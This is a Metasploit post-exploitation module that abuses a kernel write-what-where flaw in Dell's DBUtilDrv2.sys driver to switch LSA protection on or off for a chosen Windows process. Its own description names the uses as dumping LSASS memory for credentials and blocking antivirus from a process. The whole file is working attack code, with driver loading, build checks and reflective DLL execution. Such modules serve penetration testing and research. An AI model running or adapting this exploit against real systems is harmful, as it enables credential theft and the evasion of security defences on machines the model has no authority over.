##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  Rank = ManualRanking

  include Msf::Exploit::Local::WindowsKernel
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Dell DBUtilDrv2.sys Memory Protection Modifier',
        'Description' => %q{
          The Dell DBUtilDrv2.sys drivers version 2.5 and 2.7 have a write-what-where condition
          that allows an attacker to read and write arbitrary kernel-mode memory. This module
          installs the provided driver, enables or disables LSA protection on the provided
          PID, and then removes the driver. This would allow, for example, dumping LSASS memory
          even when secureboot is enabled or preventing antivirus from accessing the memory of
          a chosen PID.

          The affected drivers are not distributed with Metasploit. You will truly need to
          Bring Your Own (Dell) Driver.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'SentinelLabs', # Vulnerability discovery in original Dell driver (dbutil_2_3.sys)
          'Kasif Dekel',  # (from SentinelLabs) blog with detailed analysis
          'Red Cursor',   # Authors of PPLKiller
          'Jacob Baines'  # first reference of incomplete patch, poc, & metasploit module
        ],
        'Platform' => 'win',
        'SessionTypes' => [ 'meterpreter' ],
        'References' => [
          # TODO: R7 blog
          [ 'URL', 'https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection'],
          [ 'URL', 'https://itm4n.github.io/lsass-runasppl/'],
          [ 'URL', 'https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/' ],
          [ 'URL', 'https://attackerkb.com/assessments/12d7b263-3684-4442-812e-dc30b93def93'],
          [ 'URL', 'https://github.com/RedCursorSecurityConsulting/PPLKiller'],
          [ 'URL', 'https://github.com/jbaines-r7/dellicious' ]
        ],
        'Notes' => {
          'Reliability' => [ ],
          'Stability' => [ CRASH_OS_RESTARTS ],
          'SideEffects' => [ IOC_IN_LOGS, ARTIFACTS_ON_DISK ]
        }
      )
    )
    register_options([
      OptString.new('DRIVER_PATH', [true, 'The path containing the driver inf, cat, and sys (and coinstaller)', '']),
      OptString.new('PID', [true, 'The targetted process', '']),
      OptBool.new('ENABLE_MEM_PROTECT', [true, 'Enable or disable memory protection', 'false'])
    ])
  end

  def target_compatible?
    sysinfo_value = sysinfo['OS']
    build_num = sysinfo_value.match(/Build (\d+)/)[1].to_i
    vprint_status("Windows Build Number = #{build_num}")

    return true if sysinfo_value =~ /Windows 10/ && (build_num >= 10240 && build_num <= 22000)

    false
  end

  def run
    unless is_system?
      fail_with(Failure::None, 'Elevated session is required')
    end

    # check that the target is a compatible version of Windows (since the offsets are hardcoded) before loading the RDLL
    unless target_compatible?
      fail_with(Failure::NoTarget, 'The exploit does not support this target')
    end

    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    end

    unless datastore['DRIVER_PATH'].include? '\\'
      fail_with(Failure::BadConfig, "The driver path must be a file path. User provided: #{datastore['DRIVER_PATH']}")
    end

    params = datastore['DRIVER_PATH']
    params += ','
    params += datastore['PID']
    params += ','
    params += (datastore['ENABLE_MEM_PROTECT'] ? '1' : '0')

    execute_dll(::File.join(Msf::Config.data_directory, 'exploits', 'dell_protect', 'dell_protect.x64.dll'), params)

    print_good('Exploit finished')
  end
end
